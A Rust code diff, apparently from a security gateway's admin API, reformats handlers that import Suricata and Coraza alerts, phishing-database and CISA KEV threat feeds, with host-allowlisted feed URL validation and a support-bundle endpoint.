-    let parsed = match suricata_eve::parse_suricata_eve_body(body_text) { Ok(parsed) => parsed, Err(message) => return error(StatusCode::BAD_REQUEST, message) };
-    if parsed.alerts.is_empty() { return error(StatusCode::BAD_REQUEST, "no Suricata alert events found (event_type=alert required)"); }
-    let actor = audit_actor(&state, &headers); let event_limit = state.event_limit; let accepted = parsed.alerts.len(); let skipped_non_alerts = parsed.skipped_non_alerts;
-    match state.mutate_and_persist(|data| {
-        let mut created_ids = Vec::with_capacity(accepted); let mut enforcement_hints = 0usize; let ingest_now = now_unix();
-        for alert in &parsed.alerts { let id = data.next_event_id; data.next_event_id += 1; let event = SecurityEvent { id, timestamp_unix: alert.timestamp_unix.unwrap_or(ingest_now), client_ip: alert.client_ip, route_id: None, action: alert.action.clone(), reason: alert.reason.clone(), score: alert.score, path: alert.path.clone() }; println!("{}", security_event_log_line(&event)); data.events.push(event); created_ids.push(id); enforcement_hints = enforcement_hints.saturating_add(apply_engine_enforcement_hints(data, "engine:suricata", &alert.action, alert.client_ip, &alert.path, &alert.reason, alert.score)); }
-        enforce_event_limit(data, event_limit); let retained: HashSet<u64> = data.events.iter().map(|e| e.id).collect(); let event_ids: Vec<u64> = created_ids.into_iter().filter(|id| retained.contains(id)).collect();
-        record_successful_audit_log(data, actor, "import_suricata_eve", "ids_suricata", format!("{accepted}_alerts")); SuricataEveImportResult { accepted_alerts: accepted, skipped_non_alerts, event_ids, enforcement_hints }
-    }).await { Ok(result) => (StatusCode::CREATED, Json(result)).into_response(), Err(message) => error(StatusCode::INTERNAL_SERVER_ERROR, message) }
+struct SuricataEveImportResult {
+    accepted_alerts: usize,
+    skipped_non_alerts: usize,
+    event_ids: Vec<u64>,
+    /// DNSBL / threat-indicator rows written so gateway scoring enforces engine hits.
+    enforcement_hints: usize,
 }
 
-#[derive(Debug, Serialize)]
-struct CorazaAuditImportResult { accepted_hits: usize, skipped: usize, event_ids: Vec<u64>, enforcement_hints: usize }
-
-async fn import_coraza_audit(State(state): State<AppState>, headers: HeaderMap, body: Bytes) -> Response {
-    if !admin_authorized(&state, &headers) { return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token"); }
-    let body_text = match std::str::from_utf8(&body) { Ok(text) => text, Err(_) => return error(StatusCode::BAD_REQUEST, "Coraza audit body must be UTF-8 text") };
-    let parsed = match coraza_audit::parse_coraza_audit_body(body_text) { Ok(parsed) => parsed, Err(message) => return error(StatusCode::BAD_REQUEST, message) };
-    if parsed.hits.is_empty() { return error(StatusCode::BAD_REQUEST, "no Coraza WAF hits found (need messages[] or interrupted transaction)"); }
-    let actor = audit_actor(&state, &headers); let event_limit = state.event_limit; let accepted = parsed.hits.len(); let skipped = parsed.skipped;
-    match state.mutate_and_persist(|data| {
-        let mut created_ids = Vec::with_capacity(accepted); let mut enforcement_hints = 0usize; let ingest_now = now_unix();
-        for hit in &parsed.hits { let id = data.next_event_id; data.next_event_id += 1; let event = SecurityEvent { id, timestamp_unix: hit.timestamp_unix.unwrap_or(ingest_now), client_ip: hit.client_ip, route_id: None, action: hit.action.clone(), reason: hit.reason.clone(), score: hit.score, path: hit.path.clone() }; println!("{}", security_event_log_line(&event)); data.events.push(event); created_ids.push(id); enforcement_hints = enforcement_hints.saturating_add(apply_engine_enforcement_hints(data, "engine:coraza", &hit.action, hit.client_ip, &hit.path, &hit.reason, hit.score)); }
-        enforce_event_limit(data, event_limit); let retained: HashSet<u64> = data.events.iter().map(|e| e.id).collect(); let event_ids: Vec<u64> = created_ids.into_iter().filter(|id| retained.contains(id)).collect(); record_successful_audit_log(data, actor, "import_coraza_audit", "waf_coraza", format!("{accepted}_hits")); CorazaAuditImportResult { accepted_hits: accepted, skipped, event_ids, enforcement_hints }
-    }).await { Ok(result) => (StatusCode::CREATED, Json(result)).into_response(), Err(message) => error(StatusCode::INTERNAL_SERVER_ERROR, message) }
-}
-
-fn apply_engine_enforcement_hints(data: &mut AppData, source: &str, action: &str, client_ip: Option<IpAddr>, path: &str, reason: &str, score: u16) -> usize {
-    if action != "block" && score < BLOCK_SCORE { return 0; }
-    const TTL_SECONDS: u64 = 3_600; let mut written = 0usize; let severity = if score >= 80 { Severity::High } else { Severity::Medium };
-    let reason = { let trimmed = reason.trim(); if trimmed.len() > 200 { format!("{}…", &trimmed[..199]) } else if trimmed.is_empty() { format!("{source} engine hit") } else { trimmed.to_string() } };
-    if let Some(ip) = client_ip {
-        let dnsbl = DnsblEntry { address: ip, code: "127.0.0.2".to_string(), reason: reason.clone(), source: source.to_string(), ttl_seconds: TTL_SECONDS, prefix_len: None }; if validate_dnsbl(&dnsbl).is_ok() { upsert_dnsbl(&mut data.dnsbl, dnsbl); written += 1; }
-        let ip_indicator = ThreatIndicator { value: ip.to_string(), indicator_type: "client_ip".to_string(), severity: severity.clone(), source: source.to_string(), ttl_seconds: TTL_SECONDS }; if validate_threat(&ip_indicator).is_ok() { upsert_threat(&mut data.threats, ip_indicator); written += 1; }
+async fn import_suricata_eve(
+    State(state): State<AppState>,
+    headers: HeaderMap,
+    body: Bytes,
+) -> Response {
+    if !admin_authorized(&state, &headers) {
+        return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token");
     }
-    let path_only = path.split('?').next().unwrap_or(path).trim(); if path_only.starts_with('/') && path_only.len() > 1 { let path_indicator = ThreatIndicator { value: path_only.to_string(), indicator_type: "path".to_string(), severity, source: source.to_string(), ttl_seconds: TTL_SECONDS }; if validate_threat(&path_indicator).is_ok() { upsert_threat(&mut data.threats, path_indicator); written += 1; } }
+    let body_text = match std::str::from_utf8(&body) {
+        Ok(text) => text,
+        Err(_) => {
+            return error(
+                StatusCode::BAD_REQUEST,
+                "Suricata EVE body must be UTF-8 text",
+            );
+        }
+    };
+    let parsed = match suricata_eve::parse_suricata_eve_body(body_text) {
+        Ok(parsed) => parsed,
+        Err(message) => return error(StatusCode::BAD_REQUEST, message),
+    };
+    if parsed.alerts.is_empty() {
+        return error(
+            StatusCode::BAD_REQUEST,
+            "no Suricata alert events found (event_type=alert required)",
+        );
+    }
+
+    let actor = audit_actor(&state, &headers);
+    let event_limit = state.event_limit;
+    let accepted = parsed.alerts.len();
+    let skipped_non_alerts = parsed.skipped_non_alerts;
+    match state
+        .mutate_and_persist(|data| {
+            let mut created_ids = Vec::with_capacity(accepted);
+            let mut enforcement_hints = 0usize;
+            let ingest_now = now_unix();
+            for alert in &parsed.alerts {
+                let id = data.next_event_id;
+                data.next_event_id += 1;
+                let event = SecurityEvent {
+                    id,
+                    timestamp_unix: alert.timestamp_unix.unwrap_or(ingest_now),
+                    client_ip: alert.client_ip,
+                    route_id: None,
+                    action: alert.action.clone(),
+                    reason: alert.reason.clone(),
+                    score: alert.score,
+                    path: alert.path.clone(),
+                };
+                println!("{}", security_event_log_line(&event));
+                data.events.push(event);
+                created_ids.push(id);
+                enforcement_hints =
+                    enforcement_hints.saturating_add(apply_engine_enforcement_hints(
+                        data,
+                        "engine:suricata",
+                        &alert.action,
+                        alert.client_ip,
+                        &alert.path,
+                        &alert.reason,
+                        alert.score,
+                    ));
+            }
+            enforce_event_limit(data, event_limit);
+            // Only report IDs still retained after the event ring buffer trim.
+            let retained: HashSet<u64> = data.events.iter().map(|e| e.id).collect();
+            let event_ids: Vec<u64> = created_ids
+                .into_iter()
+                .filter(|id| retained.contains(id))
+                .collect();
+            record_successful_audit_log(
+                data,
+                actor,
+                "import_suricata_eve",
+                "ids_suricata",
+                format!("{accepted}_alerts"),
+            );
+            SuricataEveImportResult {
+                accepted_alerts: accepted,
+                skipped_non_alerts,
+                event_ids,
+                enforcement_hints,
+            }
+        })
+        .await
+    {
+        Ok(result) => (StatusCode::CREATED, Json(result)).into_response(),
+        Err(message) => error(StatusCode::INTERNAL_SERVER_ERROR, message),
+    }
+}
+
+/// Ingest Coraza / ModSecurity-compatible WAF audit JSON (object, array, or NDJSON).
+/// Maps interrupted transactions and CRS rule messages into security events.
+#[derive(Debug, Serialize)]
+struct CorazaAuditImportResult {
+    accepted_hits: usize,
+    skipped: usize,
+    event_ids: Vec<u64>,
+    /// DNSBL / threat-indicator rows written so gateway scoring enforces engine hits.
+    enforcement_hints: usize,
+}
+
+async fn import_coraza_audit(
+    State(state): State<AppState>,
+    headers: HeaderMap,
+    body: Bytes,
+) -> Response {
+    if !admin_authorized(&state, &headers) {
+        return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token");
+    }
+    let body_text = match std::str::from_utf8(&body) {
+        Ok(text) => text,
+        Err(_) => {
+            return error(
+                StatusCode::BAD_REQUEST,
+                "Coraza audit body must be UTF-8 text",
+            );
+        }
+    };
+    let parsed = match coraza_audit::parse_coraza_audit_body(body_text) {
+        Ok(parsed) => parsed,
+        Err(message) => return error(StatusCode::BAD_REQUEST, message),
+    };
+    if parsed.hits.is_empty() {
+        return error(
+            StatusCode::BAD_REQUEST,
+            "no Coraza WAF hits found (need messages[] or interrupted transaction)",
+        );
+    }
+
+    let actor = audit_actor(&state, &headers);
+    let event_limit = state.event_limit;
+    let accepted = parsed.hits.len();
+    let skipped = parsed.skipped;
+    match state
+        .mutate_and_persist(|data| {
+            let mut created_ids = Vec::with_capacity(accepted);
+            let mut enforcement_hints = 0usize;
+            let ingest_now = now_unix();
+            for hit in &parsed.hits {
+                let id = data.next_event_id;
+                data.next_event_id += 1;
+                let event = SecurityEvent {
+                    id,
+                    timestamp_unix: hit.timestamp_unix.unwrap_or(ingest_now),
+                    client_ip: hit.client_ip,
+                    route_id: None,
+                    action: hit.action.clone(),
+                    reason: hit.reason.clone(),
+                    score: hit.score,
+                    path: hit.path.clone(),
+                };
+                println!("{}", security_event_log_line(&event));
+                data.events.push(event);
+                created_ids.push(id);
+                enforcement_hints =
+                    enforcement_hints.saturating_add(apply_engine_enforcement_hints(
+                        data,
+                        "engine:coraza",
+                        &hit.action,
+                        hit.client_ip,
+                        &hit.path,
+                        &hit.reason,
+                        hit.score,
+                    ));
+            }
+            enforce_event_limit(data, event_limit);
+            let retained: HashSet<u64> = data.events.iter().map(|e| e.id).collect();
+            let event_ids: Vec<u64> = created_ids
+                .into_iter()
+                .filter(|id| retained.contains(id))
+                .collect();
+            record_successful_audit_log(
+                data,
+                actor,
+                "import_coraza_audit",
+                "waf_coraza",
+                format!("{accepted}_hits"),
+            );
+            CorazaAuditImportResult {
+                accepted_hits: accepted,
+                skipped,
+                event_ids,
+                enforcement_hints,
+            }
+        })
+        .await
+    {
+        Ok(result) => (StatusCode::CREATED, Json(result)).into_response(),
+        Err(message) => error(StatusCode::INTERNAL_SERVER_ERROR, message),
+    }
+}
+
+/// Feed proven-engine hits into gateway scoring: DNSBL for client IPs and
+/// threat indicators for IP/path. Only block-grade hits become enforcement hints.
+fn apply_engine_enforcement_hints(
+    data: &mut AppData,
+    source: &str,
+    action: &str,
+    client_ip: Option<IpAddr>,
+    path: &str,
+    reason: &str,
+    score: u16,
+) -> usize {
+    if action != "block" && score < BLOCK_SCORE {
+        return 0;
+    }
+    const TTL_SECONDS: u64 = 3_600;
+    let mut written = 0usize;
+    let severity = if score >= 80 {
+        Severity::High
+    } else {
+        Severity::Medium
+    };
+    let reason = {
+        let trimmed = reason.trim();
+        if trimmed.len() > 200 {
+            format!("{}…", &trimmed[..199])
+        } else if trimmed.is_empty() {
+            format!("{source} engine hit")
+        } else {
+            trimmed.to_string()
+        }
+    };
+
+    if let Some(ip) = client_ip {
+        let dnsbl = DnsblEntry {
+            address: ip,
+            code: "127.0.0.2".to_string(),
+            reason: reason.clone(),
+            source: source.to_string(),
+            ttl_seconds: TTL_SECONDS,
+            prefix_len: None,
+        };
+        if validate_dnsbl(&dnsbl).is_ok() {
+            upsert_dnsbl(&mut data.dnsbl, dnsbl);
+            written += 1;
+        }
+        let ip_indicator = ThreatIndicator {
+            value: ip.to_string(),
+            indicator_type: "client_ip".to_string(),
+            severity: severity.clone(),
+            source: source.to_string(),
+            ttl_seconds: TTL_SECONDS,
+        };
+        if validate_threat(&ip_indicator).is_ok() {
+            upsert_threat(&mut data.threats, ip_indicator);
+            written += 1;
+        }
+    }
+
+    let path_only = path.split('?').next().unwrap_or(path).trim();
+    if path_only.starts_with('/') && path_only.len() > 1 {
+        let path_indicator = ThreatIndicator {
+            value: path_only.to_string(),
+            indicator_type: "path".to_string(),
+            severity,
+            source: source.to_string(),
+            ttl_seconds: TTL_SECONDS,
+        };
+        if validate_threat(&path_indicator).is_ok() {
+            upsert_threat(&mut data.threats, path_indicator);
+            written += 1;
+        }
+    }
     written
 }
 
-async fn import_phishing_database_feed(State(state): State<AppState>, headers: HeaderMap, Json(request): Json<PhishingDatabaseImportRequest>) -> Response {
-    if !admin_authorized(&state, &headers) { return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token"); }
-    if let Err(message) = validate_phishing_database_import_request(&request) { return error(StatusCode::BAD_REQUEST, message); }
+async fn import_phishing_database_feed(
+    State(state): State<AppState>,
+    headers: HeaderMap,
+    Json(request): Json<PhishingDatabaseImportRequest>,
+) -> Response {
+    if !admin_authorized(&state, &headers) {
+        return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token");
+    }
+    if let Err(message) = validate_phishing_database_import_request(&request) {
+        return error(StatusCode::BAD_REQUEST, message);
+    }
+
     let (domains_text, ips_text) = match (request.import_domains, request.import_ips) {
-        (true, true) => match tokio::try_join!(fetch_text_feed(&state, &request.domain_url), fetch_text_feed(&state, &request.ip_url)) { Ok((domains, ips)) => (domains, ips), Err(message) => return error(StatusCode::BAD_GATEWAY, message) },
-        (true, false) => match fetch_text_feed(&state, &request.domain_url).await { Ok(domains) => (domains, String::new()), Err(message) => return error(StatusCode::BAD_GATEWAY, message) },
-        (false, true) => match fetch_text_feed(&state, &request.ip_url).await { Ok(ips) => (String::new(), ips), Err(message) => return error(StatusCode::BAD_GATEWAY, message) },
+        (true, true) => {
+            match tokio::try_join!(
+                fetch_text_feed(&state, &request.domain_url),
+                fetch_text_feed(&state, &request.ip_url)
+            ) {
+                Ok((domains, ips)) => (domains, ips),
+                Err(message) => return error(StatusCode::BAD_GATEWAY, message),
+            }
+        }
+        (true, false) => match fetch_text_feed(&state, &request.domain_url).await {
+            Ok(domains) => (domains, String::new()),
+            Err(message) => return error(StatusCode::BAD_GATEWAY, message),
+        },
+        (false, true) => match fetch_text_feed(&state, &request.ip_url).await {
+            Ok(ips) => (String::new(), ips),
+            Err(message) => return error(StatusCode::BAD_GATEWAY, message),
+        },
         (false, false) => (String::new(), String::new()),
     };
+
     let source_tag = request.feed_id.clone();
-    let threats = if request.import_domains { parse_phishing_domains(&domains_text, request.domain_limit).into_iter().map(|domain| ThreatIndicator { value: domain, indicator_type: "phishing_domain".to_string(), severity: request.severity.clone(), source: source_tag.clone(), ttl_seconds: request.ttl_seconds }).collect() } else { Vec::new() };
-    let dnsbl = if request.import_ips { parse_phishing_ips(&ips_text, request.ip_limit).into_iter().map(|address| DnsblEntry { address, code: PHISHING_DATABASE_DNSBL_CODE.to_string(), reason: PHISHING_DATABASE_DNSBL_REASON.to_string(), source: source_tag.clone(), ttl_seconds: request.ttl_seconds, prefix_len: None }).collect() } else { Vec::new() };
-    let feed = ThreatFeedImport { feed_id: request.feed_id, source: request.source, ttl_seconds: request.ttl_seconds, threats, dnsbl };
-    if let Err(message) = validate_threat_feed_import(&feed) { return error(StatusCode::BAD_GATEWAY, format!("invalid fetched feed data: {message}")); }
-    let actor = audit_actor(&state, &headers); match apply_threat_feed_import(&state, actor, "import_phishing_database_feed", feed).await { Ok(result) => (StatusCode::CREATED, Json(result)).into_response(), Err(message) => error(StatusCode::INTERNAL_SERVER_ERROR, message) }
+    let threats = if request.import_domains {
+        parse_phishing_domains(&domains_text, request.domain_limit)
+            .into_iter()
+            .map(|domain| ThreatIndicator {
+                value: domain,
+                indicator_type: "phishing_domain".to_string(),
+                severity: request.severity.clone(),
+                source: source_tag.clone(),
+                ttl_seconds: request.ttl_seconds,
+            })
+            .collect()
+    } else {
+        Vec::new()
+    };
+    let dnsbl = if request.import_ips {
+        parse_phishing_ips(&ips_text, request.ip_limit)
+            .into_iter()
+            .map(|address| DnsblEntry {
+                address,
+                code: PHISHING_DATABASE_DNSBL_CODE.to_string(),
+                reason: PHISHING_DATABASE_DNSBL_REASON.to_string(),
+                source: source_tag.clone(),
+                ttl_seconds: request.ttl_seconds,
+                prefix_len: None,
+            })
+            .collect()
+    } else {
+        Vec::new()
+    };
+    let feed = ThreatFeedImport {
+        feed_id: request.feed_id,
+        source: request.source,
+        ttl_seconds: request.ttl_seconds,
+        threats,
+        dnsbl,
+    };
+    if let Err(message) = validate_threat_feed_import(&feed) {
+        return error(
+            StatusCode::BAD_GATEWAY,
+            format!("invalid fetched feed data: {message}"),
+        );
+    }
+
+    let actor = audit_actor(&state, &headers);
+    match apply_threat_feed_import(&state, actor, "import_phishing_database_feed", feed).await {
+        Ok(result) => (StatusCode::CREATED, Json(result)).into_response(),
+        Err(message) => error(StatusCode::INTERNAL_SERVER_ERROR, message),
+    }
 }
 
-fn validate_phishing_database_import_request(request: &PhishingDatabaseImportRequest) -> Result<(), &'static str> {
-    if request.feed_id.trim().is_empty() { return Err("feed_id is required"); }
-    if request.source.trim().is_empty() { return Err("source is required"); }
-    if request.ttl_seconds == 0 { return Err("ttl_seconds must be greater than zero"); }
-    if !request.import_domains && !request.import_ips { return Err("at least one of import_domains or import_ips must be true"); }
-    if request.import_domains { if request.domain_limit == 0 { return Err("domain_limit must be greater than zero when import_domains is enabled"); } validate_http_url(&request.domain_url, request.allow_non_default_hosts)?; }
-    if request.import_ips { if request.ip_limit == 0 { return Err("ip_limit must be greater than zero when import_ips is enabled"); } validate_http_url(&request.ip_url, request.allow_non_default_hosts)?; }
+fn validate_phishing_database_import_request(
+    request: &PhishingDatabaseImportRequest,
+) -> Result<(), &'static str> {
+    if request.feed_id.trim().is_empty() {
+        return Err("feed_id is required");
+    }
+    if request.source.trim().is_empty() {
+        return Err("source is required");
+    }
+    if request.ttl_seconds == 0 {
+        return Err("ttl_seconds must be greater than zero");
+    }
+    if !request.import_domains && !request.import_ips {
+        return Err("at least one of import_domains or import_ips must be true");
+    }
+    if request.import_domains {
+        if request.domain_limit == 0 {
+            return Err("domain_limit must be greater than zero when import_domains is enabled");
+        }
+        validate_http_url(&request.domain_url, request.allow_non_default_hosts)?;
+    }
+    if request.import_ips {
+        if request.ip_limit == 0 {
+            return Err("ip_limit must be greater than zero when import_ips is enabled");
+        }
+        validate_http_url(&request.ip_url, request.allow_non_default_hosts)?;
+    }
     Ok(())
 }
 
 fn validate_kev_import_request(request: &KevImportRequest) -> Result<(), &'static str> {
-    if request.feed_id.trim().is_empty() { return Err("feed_id is required"); }
-    if request.source.trim().is_empty() { return Err("source is required"); }
-    if request.ttl_seconds == 0 { return Err("ttl_seconds must be greater than zero"); }
+    if request.feed_id.trim().is_empty() {
+        return Err("feed_id is required");
+    }
+    if request.source.trim().is_empty() {
+        return Err("source is required");
+    }
+    if request.ttl_seconds == 0 {
+        return Err("ttl_seconds must be greater than zero");
+    }
     Ok(())
 }
 
-async fn import_kev_feed(State(state): State<AppState>, headers: HeaderMap, Json(request): Json<KevImportRequest>) -> Response {
-    if !has_write_admin_credential(&state) { return error(StatusCode::SERVICE_UNAVAILABLE, "KEV import requires a configured write-capable admin credential"); }
-    if !admin_authorized(&state, &headers) { return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token"); }
-    if let Err(message) = validate_kev_import_request(&request) { return error(StatusCode::BAD_REQUEST, message); }
-    let body_text = match fetch_kev_catalog(&state).await { Ok(text) => text, Err(message) => return error(StatusCode::BAD_GATEWAY, message) };
-    let material = match kev_import::parse_kev_document(&body_text, request.source.trim(), request.ttl_seconds) { Ok(material) => material, Err(message) => return error(StatusCode::BAD_GATEWAY, format!("invalid fetched KEV catalog: {message}")) };
-    let actor = audit_actor(&state, &headers); let feed = ThreatFeedImport { feed_id: request.feed_id.trim().to_string(), source: request.source.trim().to_string(), ttl_seconds: request.ttl_seconds, threats: material.threats, dnsbl: material.dnsbl };
-    if let Err(message) = validate_threat_feed_import(&feed) { return error(StatusCode::BAD_GATEWAY, format!("invalid fetched feed data: {message}")); }
-    let skipped_entries = material.skipped_entries; match apply_threat_feed_import(&state, actor, "import_kev_feed", feed).await { Ok(result) => (StatusCode::CREATED, Json(KevImportResult { feed_id: result.feed_id, upserted_threats: result.upserted_threats, upserted_dnsbl: result.upserted_dnsbl, skipped_entries, last_updated_unix: result.last_updated_unix })).into_response(), Err(message) => error(StatusCode::INTERNAL_SERVER_ERROR, message) }
+async fn import_kev_feed(
+    State(state): State<AppState>,
+    headers: HeaderMap,
+    Json(request): Json<KevImportRequest>,
+) -> Response {
+    if !has_write_admin_credential(&state) {
+        return error(
+            StatusCode::SERVICE_UNAVAILABLE,
+            "KEV import requires a configured write-capable admin credential",
+        );
+    }
+    if !admin_authorized(&state, &headers) {
+        return error(StatusCode::UNAUTHORIZED, "missing or invalid X-Admin-Token");
+    }
+    if let Err(message) = validate_kev_import_request(&request) {
+        return error(StatusCode::BAD_REQUEST, message);
+    }
+
+    // Always fetches the deployment-configured CISA KEV URL (default: the
+    // real CISA feed; overridable only via server-side config, never by the
+    // request body) -- there is no request-controlled URL construction here
+    // at all, unlike the operator-URL adapters (phishing-database, TAXII).
+    // Uses its own fetch_kev_catalog rather than the shared fetch_text_feed
+    // so this config-only path never shares a function with (and can't be
+    // conflated by static analysis with) phishing-database's request-URL fetch.
+    let body_text = match fetch_kev_catalog(&state).await {
+        Ok(text) => text,
+        Err(message) => return error(StatusCode::BAD_GATEWAY, message),
+    };
+    let material = match kev_import::parse_kev_document(
+        &body_text,
+        request.source.trim(),
+        request.ttl_seconds,
+    ) {
+        Ok(material) => material,
+        Err(message) => {
+            return error(
+                StatusCode::BAD_GATEWAY,
+                format!("invalid fetched KEV catalog: {message}"),
+            );
+        }
+    };
+
+    let actor = audit_actor(&state, &headers);
+    let feed = ThreatFeedImport {
+        feed_id: request.feed_id.trim().to_string(),
+        source: request.source.trim().to_string(),
+        ttl_seconds: request.ttl_seconds,
+        threats: material.threats,
+        dnsbl: material.dnsbl,
+    };
+    if let Err(message) = validate_threat_feed_import(&feed) {
+        return error(
+            StatusCode::BAD_GATEWAY,
+            format!("invalid fetched feed data: {message}"),
+        );
+    }
+    let skipped_entries = material.skipped_entries;
+    match apply_threat_feed_import(&state, actor, "import_kev_feed", feed).await {
+        Ok(result) => (
+            StatusCode::CREATED,
+            Json(KevImportResult {
+                feed_id: result.feed_id,
+                upserted_threats: result.upserted_threats,
+                upserted_dnsbl: result.upserted_dnsbl,
+                skipped_entries,
+                last_updated_unix: result.last_updated_unix,
+            }),
+        )
+            .into_response(),
+        Err(message) => error(StatusCode::INTERNAL_SERVER_ERROR, message),
+    }
 }
 
 fn validate_http_url(value: &str, allow_non_default_hosts: bool) -> Result<(), &'static str> {
-    let parsed = reqwest::Url::parse(value).map_err(|_| "feed URL must be an absolute URL")?; let host = parsed.host_str().ok_or("feed URL host is required")?;
-    match parsed.scheme() { "https" => {}, "http" if is_loopback_host(host) => {}, "http" => return Err("feed URL scheme must be https unless host is loopback"), _ => return Err("feed URL scheme must be http or https") }
-    if !allow_non_default_hosts && !PHISHING_DATABASE_ALLOWED_HOSTS.iter().any(|allowed| host.eq_ignore_ascii_case(allowed)) { return Err("feed URL host is not allowed"); }
+    let parsed = reqwest::Url::parse(value).map_err(|_| "feed URL must be an absolute URL")?;
+    let host = parsed.host_str().ok_or("feed URL host is required")?;
+    match parsed.scheme() {
+        "https" => {}
+        "http" if is_loopback_host(host) => {}
+        "http" => return Err("feed URL scheme must be https unless host is loopback"),
+        _ => return Err("feed URL scheme must be http or https"),
+    }
+    if !allow_non_default_hosts
+        && !PHISHING_DATABASE_ALLOWED_HOSTS
+            .iter()
+            .any(|allowed| host.eq_ignore_ascii_case(allowed))
+    {
+        return Err("feed URL host is not allowed");
+    }
     Ok(())
 }
 
+// Deliberately separate from `fetch_text_feed`: that helper's `url` argument is
+// fed by operator-supplied request URLs for phishing-database imports. KEV does
+// not support a runtime URL override, so this fetch path stays structurally
+// independent and fixed to the built-in CISA host; loopback is allowed only for
+// tests that inject a local mock via `with_kev_catalog_url`.
 fn validate_kev_catalog_url(url: &str) -> Result<(), String> {
-    validate_http_url(url, true).map_err(|message| format!("invalid KEV catalog URL {url}: {message}"))?; let parsed = reqwest::Url::parse(url).map_err(|_| format!("invalid KEV catalog URL {url}"))?; let host = parsed.host_str().ok_or_else(|| format!("invalid KEV catalog URL {url}: host is required"))?;
-    if !KEV_ALLOWED_HOSTS.iter().any(|allowed| host.eq_ignore_ascii_case(allowed)) && !is_loopback_host(host) { return Err(format!("KEV catalog URL {url} host is not on the CISA KEV allowlist")); }
+    validate_http_url(url, /* allow_non_default_hosts */ true)
+        .map_err(|message| format!("invalid KEV catalog URL {url}: {message}"))?;
+    let parsed = reqwest::Url::parse(url).map_err(|_| format!("invalid KEV catalog URL {url}"))?;
+    let host = parsed
+        .host_str()
+        .ok_or_else(|| format!("invalid KEV catalog URL {url}: host is required"))?;
+    if !KEV_ALLOWED_HOSTS
+        .iter()
+        .any(|allowed| host.eq_ignore_ascii_case(allowed))
+        && !is_loopback_host(host)
+    {
+        return Err(format!(
+            "KEV catalog URL {url} host is not on the CISA KEV allowlist"
+        ));
+    }
     Ok(())
 }
 
 async fn fetch_kev_catalog(state: &AppState) -> Result<String, String> {
-    use futures_util::StreamExt; let url = state.kev_catalog_url(); validate_kev_catalog_url(url)?;
-    let response = state.feed_http.get(url).timeout(std::time::Duration::from_secs(PHISHING_DATABASE_FETCH_TIMEOUT_SECS)).send().await.map_err(|error| format!("failed to fetch KEV catalog {url}: {error}"))?; let status = response.status(); if !status.is_success() { return Err(format!("KEV catalog {url} returned HTTP {status}")); }
-    if let Some(len) = response.content_length() && len as usize > PHISHING_DATABASE_MAX_BODY_BYTES { return Err(format!("KEV catalog {url} body too large: {len} bytes (limit: {PHISHING_DATABASE_MAX_BODY_BYTES})")); }
-    let mut bytes = Vec::new(); let mut stream = response.bytes_stream(); while let Some(chunk) = stream.next().await { let chunk = chunk.map_err(|error| format!("failed to read KEV catalog body from {url}: {error}"))?; if bytes.len().saturating_add(chunk.len()) > PHISHING_DATABASE_MAX_BODY_BYTES { return Err(format!("KEV catalog {url} body too large: limit {PHISHING_DATABASE_MAX_BODY_BYTES} bytes exceeded while streaming")); } bytes.extend_from_slice(&chunk); }
-    String::from_utf8(bytes).map_err(|error| format!("KEV catalog {url} is not valid UTF-8 text: {error}"))
+    use futures_util::StreamExt;
+
+    let url = state.kev_catalog_url();
+    validate_kev_catalog_url(url)?;
+    let response = state
+        .feed_http
+        .get(url)
+        .timeout(std::time::Duration::from_secs(
+            PHISHING_DATABASE_FETCH_TIMEOUT_SECS,
+        ))
+        .send()
+        .await
+        .map_err(|error| format!("failed to fetch KEV catalog {url}: {error}"))?;
+    let status = response.status();
+    if !status.is_success() {
+        return Err(format!("KEV catalog {url} returned HTTP {status}"));
+    }
+    if let Some(len) = response.content_length()
+        && len as usize > PHISHING_DATABASE_MAX_BODY_BYTES
+    {
+        return Err(format!(
+            "KEV catalog {url} body too large: {len} bytes (limit: {PHISHING_DATABASE_MAX_BODY_BYTES})"
+        ));
+    }
+    let mut bytes = Vec::new();
+    let mut stream = response.bytes_stream();
+    while let Some(chunk) = stream.next().await {
+        let chunk = chunk
+            .map_err(|error| format!("failed to read KEV catalog body from {url}: {error}"))?;
+        if bytes.len().saturating_add(chunk.len()) > PHISHING_DATABASE_MAX_BODY_BYTES {
+            return Err(format!(
+                "KEV catalog {url} body too large: limit {PHISHING_DATABASE_MAX_BODY_BYTES} bytes exceeded while streaming"
+            ));
+        }
+        bytes.extend_from_slice(&chunk);
+    }
+    String::from_utf8(bytes)
+        .map_err(|error| format!("KEV catalog {url} is not valid UTF-8 text: {error}"))
 }
 
-fn is_loopback_host(host: &str) -> bool { host.eq_ignore_ascii_case("localhost") || host.parse::<IpAddr>().map(|ip| ip.is_loopback()).unwrap_or(false) }
+fn is_loopback_host(host: &str) -> bool {
+    host.eq_ignore_ascii_case("localhost")
+        || host
+            .parse::<IpAddr>()
+            .map(|ip| ip.is_loopback())
+            .unwrap_or(false)
+}
 
 async fn support_bundle(State(state): State<AppState>) -> Json<SupportBundle> {
-    let data = state.inner.read().await; let generated_at_unix = now_unix();
-    Json(SupportBundle { generated_at_unix, health: state.health_status(), kpis: kpi_snapshot_at(&data, generated_at_unix), commercial: data.commercial.clone(), readiness: commercial_readiness_snapshot_at(&data, generated_at_unix), evidence_manifest: buyer_evidence_manifest_at(&data, generated_at_unix), threat_feed_freshness: threat_feed_freshness_snapshot(&data.threat_feeds, generated_at_unix), route_count: data.routes.len(), threat_indicator_count: data.threats.len(), dnsbl_entry_count: data.dnsbl.len(), threat_feed_count: data.threat_feeds.len(), event_count: data.events.len(), audit_log_count: data.audit_logs.len() })
+    let data = state.inner.read().await;
+    let generated_at_unix = now_unix();
+    Json(SupportBundle {
+        generated_at_unix,
+        health: state.health_status(),
+        kpis: kpi_snapshot_at(&data, generated_at_unix),
+        commercial: data.commercial.clone(),
+        readiness: commercial_readiness_snapshot_at(&data, generated_at_unix),
+        evidence_manifest: buyer_evidence_manifest_at(&data, generated_at_unix),
+        threat_feed_freshness: threat_feed_freshness_snapshot(
+            &data.threat_feeds,
+            generated_at_unix,
+        ),
+        route_count: data.routes.len(),
+        threat_indicator_count: data.threats.len(),
+        dnsbl_entry_count: data.dnsbl.len(),
+        threat_feed_count: data.threat_feeds.len(),
+        event_count: data.events.len(),
+        audit_log_count: data.audit_logs.len(),
+    })
 }
 
